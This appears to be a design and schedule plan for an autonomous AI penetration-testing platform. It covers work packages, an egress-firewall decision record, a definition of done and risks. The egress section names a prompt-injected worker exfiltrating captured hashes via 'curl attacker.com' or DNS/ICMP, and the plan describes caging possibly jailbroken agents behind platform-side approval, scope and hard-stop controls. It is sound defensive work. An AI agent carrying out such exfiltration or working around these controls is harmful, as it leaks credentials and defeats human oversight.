| **33** | `internal/apiclient`: typed `/api/v1` client for the agent binaries | A4-min, A5-min, DESIGN §1 boundary | `internal/apiclient/{client.go,poll.go,retry.go}` | `TestEveryA4MinEndpointHasATypedMethod`, `TestAttachesJobTokenNeverUserCookie`, `TestRetriesOnlyIdempotentVerbs`, `TestErrorEnvelopeDecodedToErrsKind`, `TestAgentBinaryImportsNothingPlatformOnly` (import audit over DESIGN §1), `TestCursorPagingTerminates` | 28 | β |
| **34** ★ | `internal/agentloop` + `internal/orchestrator` + `cmd/orchestrator`: the own loop | ADR-0015, ADR-0016 §4, IR-3, A4-min, A7-min | `internal/agentloop/{loop.go,context.go,toolcall.go,retry.go}`, `internal/orchestrator/{profile.go,plan.go,prompt.go}`, `cmd/orchestrator/main.go` | `TestLoopStopsAtMaxIterations`, `TestEveryToolCallRoutesThroughAPIClient`, `TestDangerousActionIsProposedNeverExecuted`, `TestApprovalExpiredTriggersReplan`, `TestScopeDeniedIsObservedAndReplanned`, `TestMalformedToolCallRetriedThenAgentError`, `TestContextBoundedByPageLimit`, `TestSelfCorrectionSupersedesHypothesis`, `TestAgentBinaryHasNoProviderClientAndNoCredentials` (import + env audit), `TestPromptContainsNoSecretMaterial` | 28, 32, 33 | — |
| **35** ★ | `internal/api` + `cmd/platform`: router, middleware, the ≈20 handlers | A4-min, A5-min, A0-3, A0-4, A1-7, A1-8, Q6's three layers | `internal/api/{router.go,middleware.go,handlers_*.go}`, `cmd/platform/main.go` | `TestEveryRouteDeclaresPrincipalClassAndScope`, `TestMachinePrincipalHardBlockedFromQ6Endpoints`, `TestErrorKindToHTTPStatusTableAll13`, `TestEnvelopeShapeOnSuccessAndError`, `TestPagingCursorRoundTrip`, `TestEngagementScopingOnEveryRead` (cross-engagement negatives, A1-8.6/A2-11.4), `TestRequestBodyCapEnforced`, `TestAppendRejectsNonCKindFromWorker`, `TestApprovalPayloadCarriesExactArgvAndUntrustedFlag` (ADR-0018 §1/§4), `TestUntrustedContentNeverBecomesConfiguration` (A1-4.4) (**high review bar**) | 23, 25, 26, 28 | — |
| **36** | `internal/evidence`: content-addressed store on a volume | ADR-0009 §2, A1-3.3 `evidence_stored`, A2-9, D8 | `internal/evidence/{store.go,hash.go,path.go}` | `TestPathDerivedFromSHA256`, `TestDuplicateUploadIsIdempotent`, `TestSizeCapEnforced`, `TestSecretScanRejectsNeverRedacts` (D8), `TestEvidenceIDShapePerA0_1_2`, `TestEngagementScopedRead`, `TestSeamHasNoDeleteMethod`, `TestStoredBytesReproducePublishedSHA256` | 13, 23 | β |
| **37** | `internal/notify`: HMAC-signed webhooks, retries, delivery log, **the D5 head anchor** | ADR-0012 §2/§3/§6, A1-3.3 `notification_sent`, A1-5.8 (4), A1-6.6 | `internal/notify/{webhook.go,sign.go,retry.go,anchor.go}` | `TestHMACSignatureVerifiableByRecipient`, `TestPayloadCarriesDeepLinkToApprovalPage`, `TestRetriesWithBackoffAndDeliveryLog`, `TestTargetNameOnlyNeverURLInEvent` (A0-3.7), `TestHeadAnchorPostedEvery100Seq`, `TestAnchorDeliveryFailureIsChainedNotSwallowed`, `TestOnlyTheSevenNotificationKinds`, `TestWebhookURLComesFromEnvNotFromAnyRequest` (A9 SSRF surface absent, §2.5) | 11, 23 | β |
| **38** ★ | `internal/ui`: login, approval queue, run view, hard-stop button (HTMX + `html/template` + `embed.FS`, no Node step) | A4-min reads, ADR-0018 §1/§4, ADR-0022 follow-up, SPEC §6 (untrusted content), D13 | `internal/ui/{router.go,handlers_*.go,templates/*.html,static/*.css}`, wiring in `cmd/platform` | `TestApprovalPageRendersExactArgvNotJustProse`, `TestUntrustedContentEscapedAndVisiblyFlagged`, `TestStrictCSPAndNoInlineScript`, `TestApproveButtonCarriesFingerprintHashAndCSRFToken`, `TestOnlyAssignedOperatorSeesApproveButton`, `TestHardStopRequiresAdminOrOperator`, `TestProvenanceGradeRenderedVerbatimNotReinvented` (ADR-0022), `TestTemplatesServedFromEmbedFSNoNodeBuildStep`, `TestQueuePollsWithCursorAndDoesNotDuplicateRows` | 24, 35 | — |
| **39** ★ | `cmd/worker` + `internal/worker`: the tool runtime | A7-min, Q6 worker addendum, A1-7.4, A1-3.3 **C** kinds, ADR-0009 §3 | `cmd/worker/main.go`, `internal/worker/{exec.go,report.go,revert.go,summarize.go}` | `TestWorkerHasNoGraphAccess` (Q6), `TestWorkerHasNoDatabaseAccess`, `TestCommandExecutedEventCarriesExactArgv`, `TestOutputSummarizedAndCappedAt2048`, `TestRevertRecordEmittedForEveryStateChangingEffect`, `TestSecretScanOnTaskResult`, `TestEgressFailureIsReportedNotRetriedForever`, `TestWorkerExitsOnPlatformKill`, `TestNoSecretInAnyAppendedPayload` | 28, 33 | — |
| **40** ★ | Tool + service images, pinned | ADR-0008, D16, WP-31's registry, SPEC §10 | `deploy/docker/{platform,orchestrator,worker-recon,worker-exploit}.Dockerfile` | `TestBuiltImageDigestsMatchRegistryJSON` (build-time script, CI), `TestNoDockerCLIOrSocketInAnyAgentImage`, `TestAgentImagesRunAsNonRoot`, `TestToolVersionsPinnedNotLatest`, `TestNoPackageInstallAtRuntime` (image is offline-capable) | 31, 39 | — |
| **41** ★ | `deploy/compose` + the acceptance runbook | ADR-0002, SPEC §10, §5's ADR, §7.2's DoD | `deploy/compose/{docker-compose.yml,.env.example}`, `docs/runbook-first-htb-run.md` | `TestComposeConfigRenders` (`docker compose config`), `TestPlatformIsTheOnlyContainerWithDockerSocket`, `TestPostgresNotReachableFromRunNetwork`, the three-probe egress assertion, and the runbook's own §7.2 checklist executed end to end | 30, 35, 38, 40 | — |

**Fan-out rule:** β = {31, 36, 37} ∥ with each other and with α = {24, 25} and
with δ = {27, 28}; no two packages in a set touch the same file. WP-29 needs
26 + 27 + 31. WP-34 needs 28 + 32 + 33. WP-35 needs 23 + 25 + 26 + 28. WP-38
needs 24 + 35. WP-40 needs 31 + 39. WP-41 needs everything. The doc WPs (27,
28) are the gate: **no code may be written against a Draft**
(`contracts/README.md`), so 29/33/34/35/38/39 all sit behind them.

### 4.2 Critical path

```
WP-08/13 (today)
  → 09,14 → 10,15 → 11,16 → 12,17 → 18,19,20,21 → 22
  → 23 (store/postgres) ─────────────┐
  → 27,28 (A7/A4/A5 freeze) ─────────┤   ← gated on your D10–D18 answers
  → 26 (policy) → 29 (broker) → 30 (netpolicy + probe)
  → 32 (llm gateway) → 33 (apiclient) → 34 (agentloop) → 39 (worker)
  → 35 (api) → 38 (ui) → 40 (images) → 41 (deploy + runbook) → first run
```

Off the critical path, and therefore where a slipped session should be
absorbed: **24, 25** (α), **31, 36, 37** (β). Everything marked ★ has no
parallel alternative.

---

## 5. THE BLOCKING ADR — worker egress (adversarial A3, CRIT, no ADR)

Must be decided before the broker spawns anything (WP-29/30). ADR-0002 fixes
Docker and ADR-0017 fixes never-a-docker-socket for agents, so all options live
inside those. The threat is specific: a prompt-injected worker exfiltrating
captured hashes via `curl attacker.com`, or encoding them into DNS/ICMP.

The hard constraint that kills the obvious answer: **nmap does raw sockets. It
cannot be proxied.** Any design that assumes tool traffic is HTTP is wrong for
the recon phase, which is the phase the slice actually runs.

| Option | Mechanism | Pros | Cons |
|---|---|---|---|
| **E1** ★ recommended | Normal per-run Docker bridge networks drawn from a **pre-provisioned pool**; the **host firewall** (nftables, installed once by `deploy/netpolicy/install.sh`) allows pool-subnet → HTB target subnet (TCP/UDP/ICMP) and pool-subnet → platform API host:port and UDP/53 to one pinned resolver, and **drops everything else**. The broker only *allocates* a network name; **no container gets `NET_ADMIN`, and the platform never programs the firewall** | no privileged component anywhere; stdlib-only broker (it reads a pool file); the entire rule set is one inspectable file a human can read before authorising a run; works with raw sockets; testable in minutes by the probe; a compromised broker still cannot widen egress | egress policy is not per-engagement — every run gets the same shape; changing the allowed target set means re-running `install.sh`; pool size bounds concurrency; a silent bug in `install.sh` is invisible unless the probe runs |
| **E2** | A tiny privileged **`netpolicy` sidecar** (own image, `NET_ADMIN`, no LLM, no DB, stdlib `net/http`) that programs nftables per run from the engagement scope; the broker calls it | real A3 — egress derived from *this* engagement's scope; scales to customer engagements; platform container stays unprivileged | a new root-equivalent component that must itself be audited; a crash can leak rules (needs a default-deny base + a reaper); one more image and one more hand-rolled protocol; more failure modes than the whole broker |
| **E3** | `internal: true` networks, no IP route at all; every byte through a platform-owned forward proxy (CONNECT + a DNS resolver in the proxy) | single Go enforcement point, unit-testable, no `NET_ADMIN`, no host firewall, every connection attempt audited for free, DNS exfil visible | **fails the slice**: raw-socket scanners (nmap SYN/ICMP) cannot traverse a proxy. Correct answer later for HTTP-only tooling, wrong answer now |
| **E4** | No restriction for the first run ("it's only a lab") | zero work | **reject.** A3 is CRIT precisely because the worker is the injection-driven component; `curl attacker.com` from a container holding captured hashes is the named threat. It would also make the first run unauditable against the product's own central claim |

**Recommendation: E1 now, E2 as the scheduled upgrade, behind one seam.**
`internal/broker/netpolicy.go` exposes `Allocate(runID, scope) (networkName, error)`;
E1's implementation reads `deploy/netpolicy/pool.json` and returns a name; E2's
implementation calls the sidecar. This is an interface with a concrete second
consumer already on the roadmap, which is what DESIGN §2 requires before an
abstraction earns its keep.

Details that must be in the ADR, because they are where E1 silently fails:

| Item | Ruling |
|---|---|
| ICMP | allowed **only** to the target subnet (nmap ping scan); dropped elsewhere |
| DNS | UDP/53 to exactly one pinned resolver; no container may use another. DNS is the exfil channel A3 names, so this is not a convenience setting |
| Platform reachability | workers reach the platform's published API port only; the `platform` Docker network (and postgres) is **not** attached to any run network |
| Orchestrator | no route to the target subnet at all — it never executes (ADR-0007, A1-7.4) |
| Host | run networks get no route to the Docker host's other interfaces; `docker.sock` exists only in the `platform` network's container |
| Probe | `deploy/netpolicy/probe.sh` runs inside a real worker image and asserts **allow target / allow platform API / deny internet / deny ICMP off-target**. It is part of WP-30's acceptance and of the runbook's pre-flight. A run without a green probe does not start |
| Residual, declared | the platform container holds `docker.sock`, which is root-equivalent on the host. A socket proxy does not help: it cannot deny the `containers/create` options the broker legitimately needs. The compensating controls are that every broker action is a chained event, that the host firewall rules exist independently of the platform, and that backlog §7's platform-host-compromise review plus A11's accepted residual already cover this scenario. **Say so in the ADR rather than discovering it later** |

---

## 6. WHAT IS NOT CUT

Your list is right. I would keep all five, add two, and narrow one.

| Item | Kept | Why it is the product and not the scaffolding |
|---|---|---|
| Event hash chain **and its verification walk** (WP-10 + WP-12) | **yes, both halves** | chaining without verification is tamper-*delayed*, not tamper-evident: nobody knows the log was rewritten until something walks it. Q11 fixed verification at startup and before export; the startup half is what the slice has. The T1–T17 tamper matrix is the proof, and it is the single most persuasive artifact you can show a person authorising an autonomous attack. `ponytail:` a full no-sampling walk (A1-6.4) is milliseconds at one box's event count and minutes at ~10⁶ — A1-6.9's checkpoint mechanism is the upgrade path and already needs its own ADR |
| Platform-core enforcement of scope / blacklist / approval / hard stop (WP-26) | **yes** | C5 and SPEC §6: enforcement is never in the agents. This is the answer to A1/A13 — a jailbroken or injected agent still cannot act outside its cage. Cut it and the platform is a wrapper around a chat model with root |
| Spawn-broker isolation (WP-29) | **yes** | ADR-0017 closes A2, the single worst escalation path (socket = host root). It is also what makes the hard stop respawn-proof, which is what makes the hard stop *mean* something |
| Evidence store (WP-36) | **yes — the store, not the browser** | ADR-0009 §2 and the reproducibility claim. The store is content-addressed write + sha256 + one event, maybe 100 lines; the *UI* for it is a page nobody needs on run one (§2.5). Cut the page, keep the bytes and the hashes |
| Secret-free serialization (WP-13 secretscan, WP-32's exclusion, A1-4.9 / A2-9) | **yes** | ADR-0020 §4: captured credentials never leave the platform under *any* policy. It is the only control that still holds when D12 turns masking off, and D8's reject-never-redact is already frozen. `secretscan` lands today; not using it would be the strangest cut available |
| **ADD: the quarantine seam** (A2-8, WP-16) | **yes** | C5's "blacklist beats allowlist" is unobservable without it, and D7 ruled that blacklisted discoveries are **recorded, not refused**. The HTB VPN subnet guarantees the agent sees hosts outside the /32 on run one. Without quarantine we either drop the discovery (violating D7 and losing the audit) or write it as an actionable target (violating ADR-0016 §2) |
| **ADD: the signed-webhook chain-head anchor** (A1-5.8 (4), D5, WP-37) | **yes** | You approved D5 explicitly and it discharges ADR-0021's load-bearing follow-up. It is the *only* control that survives an attacker with both store-write and log-write on one host — the exact residual A11 leaves open. And it is nearly free here: notify already exists for `approval_required`, so the anchor is one timer and one payload over a mechanism we are building anyway. Deferring it would hollow out the tamper-evidence claim in precisely the scenario the chain exists for |

**Where I would challenge your list:** not by cutting an item, but by cutting
the *UI* that hides inside two of them. "The evidence store" and "the approval
queue" are each a store plus a page; the page is 80% of the work and 0% of the
guarantee. Run one keeps both stores and one page (approvals, because a human
must actually press the button) and reads evidence over HTTP.

One more thing I considered cutting and would not: **the context graph.**
Dropping WP-14/15/16/18 would save ~2 sessions and the orchestrator could work
off the event log alone for one box. It would break ADR-0015's explicit
product-owner requirement (iteration, self-correction and learning within the
running engagement, backed by a per-engagement knowledge structure), SPEC §5
step 8, and ADR-0007's context hygiene — and it would remove the substrate A3
is supposed to be designed against after this run, which would waste the very
lever D11 pulls. Not cut.

---

## 7. THE SCHEDULE

Two sessions a week, Tuesday and Friday, from today. Assumes the observed rate:
one session delivers 2–3 small packages, or one large package, *including* the
independent review fanout (WP-04/05/06 and WP-07 on 2026-09-24 are the
calibration).

| S | Date | Packages | Gate that must be green before leaving the session |
|---|---|---|---|
| 1 | 2026-09-29 | WP-08 paging, WP-13 secretscan *(in flight)* | five gates + `-race`; `go.mod` still zero requires |
| 2 | 2026-10-02 | WP-09 events envelope/taxonomy ∥ WP-14 graph kinds | `TestKindListIs42AndClosed`, `TestNodeKindListClosed` |
| 3 | 2026-10-06 | WP-10 chain primitives ∥ WP-15 graph validation | `TestChainVectorDigests` byte-exact against A1 §4.3 |
| 4 | 2026-10-09 | WP-11 events validation ∥ WP-16 quarantine | `TestQuarantineIsNeverCallerSettable` |
| 5 | 2026-10-13 | WP-12 verification walk ∥ WP-17 store seams | `TestTamperMatrixT1ToT17` all 17 rows detect **and** name `break_kind` |
| 6 | 2026-10-16 | WP-18 ingest ∥ WP-19/20/21 contract suites (3 lanes) | the `contracts/README.md` merge gate passes for A0, A1, A2 |
| 7 | 2026-10-20 | WP-22 store/postgres (pgx vendored) ∥ WP-31 tools registry | `TestDBLevelAppendOnly`, `TestIDOrderingMatchesByteOrderCollateC`; **ADR-0010 exception list is the only thing in `go.mod`** |
| 8 | 2026-10-23 | **Decision session: D10–D18 + the §5 egress ADR.** Also run the 20-call model tool-calling smoke test (risk R1) | your answers recorded in a session tracker; the egress ADR accepted; smoke test ≥90% well-formed tool calls |
| 9 | 2026-10-27 | WP-27 A7-min ∥ IR-3 agent-loop ruling ∥ IR-4 DDL | A7-min frozen with a recomputable fingerprint vector; IR-3 fits on one page |
| 10 | 2026-10-30 | WP-28 A4-min + A5-min freeze | A4-min/A5-min frozen; every authorization clause carries a positive **and** a negative test id |
| 11 | 2026-11-03 | WP-23 store/postgres schema+impls ∥ WP-24 auth | `TestPBKDF2MatchesRFC6070Vectors`, `TestApprovalIsSingleUseAtDBLevel` |
| 12 | 2026-11-06 | WP-26 policy ∥ WP-25 machine tokens | `TestBlacklistBeatsAllowlist`, `TestBlacklistBeatsApproval`, `TestQ6ExcludedVerbsHardBlocked` |
| 13 | 2026-11-10 | WP-29 broker ∥ WP-36 evidence | `TestOrchestratorGetsNoDockerSocketMount`, `TestHardStopKillsEveryContainerOfRun` |
| 14 | 2026-11-13 | WP-30 netpolicy + probe ∥ WP-37 notify | **all four probe assertions green inside a real worker container**; `TestHeadAnchorPostedEvery100Seq` |
| 15 | 2026-11-17 | WP-32 llm provider + gateway | `TestSecretExclusionUnderEveryPolicy`, `TestSSEStreamFramingAndDoneSentinel` |
| 16 | 2026-11-20 | WP-33 apiclient ∥ WP-35 api (part 1: router, middleware, auth'd reads) | `TestMachinePrincipalHardBlockedFromQ6Endpoints`, `TestEngagementScopingOnEveryRead` |
| 17 | 2026-11-24 | WP-35 api (part 2: spawns, approvals, append, llm) ∥ WP-38 ui (login + approval queue) | `TestApprovalPayloadCarriesExactArgvAndUntrustedFlag`, `TestApproveButtonCarriesFingerprintHashAndCSRFToken` |
| 18 | 2026-11-27 | WP-34 agentloop ∥ WP-38 ui (run view + hard stop) | `TestDangerousActionIsProposedNeverExecuted`, `TestLoopStopsAtMaxIterations` |
| 19 | 2026-12-01 | WP-39 worker | `TestWorkerHasNoGraphAccess`, `TestRevertRecordEmittedForEveryStateChangingEffect` |
| 20 | 2026-12-04 | WP-40 images ∥ WP-41 compose + runbook | `TestBuiltImageDigestsMatchRegistryJSON`, `docker compose config` renders, `TestPlatformIsTheOnlyContainerWithDockerSocket` |
| 21 | 2026-12-08 | **Dry run against a throwaway target container** (a local VM or container playing "the box", no HTB, no LLM cost concerns) — then, if green, **first HTB run attempt 1** | §7.2 in full |
| 22 | 2026-12-11 | Buffer: first HTB run attempt 2 / fixes from 21 | §7.2 in full |

**Milestone date: 2026-12-08, band 2026-11-24 → 2027-01-15.** I give a band
rather than a date because three unknowns in §8 have no precedent in this repo.
Session 21's dry run against a non-HTB target is deliberate: burning an HTB
machine to discover that the SSE framing is wrong is a waste of the scarcest
resource in the schedule, which is your attention, not compute.

### 7.1 Effort comparison, honestly

| | Current plan (WP-00…WP-22) | This plan |
|---|---|---|
| Sessions to first box | never — WP-22 is the end of the road and produces no binary | 21 (band 18–26) |
| Sessions to a runnable platform | your estimate: 25–35 → ~Feb 2027 | 21 → ~Dec 2026 |
| What is left unbuilt afterwards | everything above WP-22 | A3–A8 full contracts, report, cleanup, masking, SSE, Pi node, SSO, observability, model benchmarking, every enterprise P0 |

The 21 is not "faster work". It is the same work minus nine named deferrals,
with the design sessions that were blocking (§1 A3, §3 UI, §5 agent loop, §6
persistence, §7 egress) compressed into interim rulings (IR-1…IR-5) and one
real ADR. **The debt is listed, priced and reversible under Q13; it is not
hidden.**

### 7.2 Definition of done — "first HTB run" (falsifiable)

**Pre-flight, all observed before the run starts:**
1. `docker compose up` brings up postgres + platform; `GET /healthz` returns 200.
2. Platform startup logs `chain_verified` for the engagement with
   `verified_count == 0` at genesis and no `chain_break_detected`.
3. `deploy/netpolicy/probe.sh` inside a real worker image: **allow target
   subnet / allow platform API / deny internet / deny ICMP off-target** — four
   assertions, four observed results.
4. `docker inspect` on a spawned orchestrator shows: no `docker.sock` mount, no
   route to the target subnet, exactly one secret in env (its job token).

**Setup:** you start the box on HTB, note the IP, and create the engagement by
`curl` with scope = that /32 (+ the HTB VPN subnet for routing), blacklist =
HTB infrastructure ranges and your own LAN, assigned operator = you,
`llm_data_policy: cloud_raw`, approval timeout 2 h.

**During the run, observed in the UI in this order:**
`run_started` → `model_config_snapshotted` → `job_spawned` → `spawn_requested`
→ `task_spawned` → `container_started` (≥1 recon worker visible in `docker ps`)
→ `command_executed` carrying the exact argv → `evidence_stored` whose published
`sha256` is reproduced by `sha256sum` on the stored file → `graph_node_written`
for at least one `host` and one `service` node → `approval_requested` for a
risk-tier-requiring action → you approve **from the queue page, which shows the
exact argv** → `approval_executed` with the **same `fingerprint_hash`** →
`task_result{succeeded}` → the contents of `user.txt` present in an evidence
artifact.

**The core assertion, provable by one query, not by impression:** zero
`command_executed` events for a risk-tier-requiring tool that lack a preceding
`approval_executed` with a matching `fingerprint_hash`, in the same run.

**Negatives deliberately provoked during the run** (not hoped for — the runbook
lists how to provoke each): one `scope_denied` (orchestrator asked for a target
outside the /32), one `blacklist_denied`, one
`action_blocked{fingerprint_mismatch}` (argv changed after approval), one
`action_blocked{hard_stop_active}` after you fire the hard stop, and
`container_killed` for every container of the run with **no respawn within 60 s**.

**Afterwards, in the log:**
- `run_ended` present; the run's containers are gone from `docker ps -a`; the
  platform container is the only one still running.
- A full-walk `chain_verified` over the engagement with `break_count == 0` and
  `verified_count == ` the engagement's event count.
- `chain_head_trail` has ≥1 row and there is ≥1
  `notification_sent{notification_kind: chain_head_anchor, delivery_status:
  delivered}`.
- Zero secretscan rule-table hits in any stored event payload, graph node or
  evidence artifact; every rejection that did occur is visible as
  `action_blocked{append_rejected}` — none silent.
- `llm_call` events carry `endpoint_name` (never a URL), `egress_policy:
  cloud_raw`, and `excluded_secret_count ≥ 0`; **no** `llm_call` payload or log
  line contains model credentials or a captured secret.

**Explicitly not required for done:** root/privesc, a report, a cleanup run, a
second box, SSE, masking, the Pi node, any enterprise P0.

---

## 8. THE RISKS

The three most likely to make the estimate wrong.

| # | Risk | Why it is the risk | Early warning sign — check this, do not wait to notice |
|---|---|---|---|
| **R1** | **The agent loop is the only package in this plan with no precedent in the repo and no frozen contract to lean on.** Backlog §5 (agent model & loop design) has never happened. Everything merged so far is pure functions against a frozen contract with named tests and a mechanical oracle. WP-34 is a stateful loop streaming from a live, nondeterministic model, parsing tool calls that may be malformed, deciding propose-vs-execute, and self-correcting against a graph. It is also where the model's own tool-calling reliability (SPEC §7 records it per model; backlog §11 benchmarking has never happened) becomes our problem | **Session 8's smoke test: 20 tool-calling calls against the chosen model. If fewer than 18 return well-formed tool-call JSON, WP-34 is not a work package, it is a research project** — change the model or widen the parser's tolerance *before* writing the loop, and re-cut the date. Second sign: IR-3 cannot fit the loop's tool vocabulary, iteration bound and malformed-call retry policy on one page. Third sign: the first `llm_call` → `spawn_requested` → `task_result` round trip against a real model takes more than one session to go green |
| **R2** | **Worker egress × the HTB VPN × Docker networking is an integration problem that does not unit-test, and every failure mode is silent.** A scan that returns nothing looks exactly like a quiet box, not like a dropped packet. E1's rule set has to be right on a real host, with a real VPN, with nmap's raw sockets. This is also the CRIT finding with no ADR, so it carries design risk *and* integration risk in the same two weeks | **WP-30's probe must be green in the same session it is written.** Four assertions from inside a real worker container; if any is red, stop and re-plan the network design before building anything on top of it. Second sign, and this one invalidates E1 outright: needing `--net=host`, `NET_ADMIN` in a worker, or a `cap_add` anywhere to make nmap work — that moves us to E2 and adds a privileged component. Third sign: `docker compose config` cannot express the pool without a custom network plugin |
| **R3** | **The review fanout has been the dominant cost per package, and the new packages are bigger than anything built so far.** WP-07 (cjson, 2094 lines) needed three independent reviews and produced two contract errata; WP-04/05/06 produced 18 findings and two errata. Every erratum is a product-owner round trip. WP-29/32/34/35/38 are each larger, all five touch AGENTS.md's high-review-bar areas (auth, tokens, streaming parsers, the broker, enforcement), and safety paths additionally require the negative test for every MUST | **The ratio of review sessions to build sessions exceeding 1:1 for two consecutive packages**, or any single package producing more than one erratum that needs your ruling. Either means the two-sessions-a-week assumption is false and the date should be re-cut immediately rather than absorbed silently. Cheap leading indicator, checkable every session: count PO round trips per merged package — it has been ~0.7 so far, and the plan assumes it stays under 1.0 |

A fourth thing I will not pretend to forecast: **how the chosen model behaves on
a real box.** Run 21's dry run against a throwaway target exists to separate
"our platform is broken" from "the model cannot pentest", which are very
different schedule problems. If the second one is the answer, no amount of
platform work fixes it and the honest milestone becomes "the platform correctly
executed and logged an agent that failed to root the box" — which §7.2's core
assertion still satisfies, and which is still worth having.

---

## 9. What I do not know

| Unknown | Effect on this plan |
|---|---|
| Which HTB machine you will pick, and whether it is startable on your account | §1.1 gives criteria, not an instance. A box whose foothold needs a browser moves WP-40 and adds a session |
| The current HTB VPN subnet and whether your host's VPN is up inside the Docker bridge's routing | §5's rule set is written against "the target subnet"; the concrete CIDRs go in `pool.json` |
| Which model endpoint and which exact model the orchestrator role uses, and its measured tool-calling reliability | R1's smoke test resolves it in session 8; SPEC §7's supported-model list does not exist yet |
| How many events one easy-box run actually produces | Affects the A3 view budgets (D11) and the verification walk's cost. This is data the run produces, which is the argument for running first |
| Whether your review capacity stays at the 2026-09-24 rate | R3. The schedule assumes you, not the agents, are the constraint |
| Whether `docker.sock` in the platform container is acceptable to you long-term | §5's declared residual. It is inherent to ADR-0017 §1 and I see no way to remove it without giving up platform-owned lifecycle |
